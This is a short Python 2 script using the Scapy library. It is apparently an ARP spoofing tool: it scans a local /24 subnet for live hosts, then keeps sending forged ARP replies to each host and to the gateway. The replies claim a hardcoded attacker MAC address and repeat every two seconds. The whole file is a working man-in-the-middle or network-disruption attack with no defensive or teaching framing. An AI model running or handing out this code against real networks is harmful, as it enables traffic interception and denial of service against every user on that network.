from scapy.all import *
import time
from threading import Thread
import Queue

targets_list = []
EXCLUDES = [] #friend list
POISON_BOTH_WAYS = 1
HW_SRC = "1c:3a:c1:62:f3:9f"
DELAY_STARTING_SCAN_THREADS = 0.1
IPS_PER_THREAD = 10
ARP_TIMEOUT = 3 # arp resolution timeout
POISON_INTERVAL = 2 # send poison packets after this much seconds
BACKGROUND_SCAN_INTERVAL = 120 # scan after each x seconds for new hosted

def getmac(targetip):
  arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
  resp = srp(arppacket, timeout=ARP_TIMEOUT , verbose= False)
  try:
    targetmac= resp[0][0][1].hwsrc
    return targetmac
  except:
    return False

def spoofarpcache(targetip, targetmac, sourceip):
  poison= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac, hwsrc= HW_SRC)
  send(poison, verbose= False)

class ScanWorker(Thread):
  def __init__(self, queue):
    Thread.__init__(self)
    self.queue = queue

  def run(self):
    start,end,base = self.queue.get()
    end += start
    end = 255 if end>255 else end
    while True:
      for target_ip_index in range(start,end):
        target_ip = base+str(target_ip_index)
        target_mac = getmac(target_ip)
        if target_mac and target_ip not in EXCLUDES:
          target = {"ip":target_ip,"mac":target_mac}
          if target not in targets_list:
            print "New host "+target_ip
            targets_list.append(target)

      time.sleep(BACKGROUND_SCAN_INTERVAL)

def gatewaymac(ip):
  print "Searching gateway"
  mac = getmac(ip)
  if mac==False:
    print "gateway unreachable"
    quit()
  else:
    print "Gateway at "+mac
    return mac

def main():

  gateway_ip= raw_input("Gateway IP (eg '192.168.2.1'): ")
  base =  raw_input("Base address (eg '192.168.2.'): ")
  start = 2
  end = 255

  gateway_mac = gatewaymac(gateway_ip)

  print "Scan Started."

  queue = Queue.Queue()

  for cursor in range(start, end, IPS_PER_THREAD):
      worker = ScanWorker(queue)
      worker.start()
      queue.put((cursor,IPS_PER_THREAD,base))
      time.sleep(DELAY_STARTING_SCAN_THREADS)

  time.sleep( (DELAY_STARTING_SCAN_THREADS * queue.qsize()) + (IPS_PER_THREAD*ARP_TIMEOUT)) # maxtime for first scan

  print str(len(targets_list)) + " hosts found"
  print targets_list
  print "Started poisoning"

  while True:
    for target in targets_list:
      ip = target["ip"]
      mac = target["mac"]
      spoofarpcache(ip, mac, gateway_ip)
      if POISON_BOTH_WAYS:
        spoofarpcache(gateway_ip, gateway_mac, ip) #
    time.sleep(POISON_INTERVAL)

if __name__=="__main__":
  main()
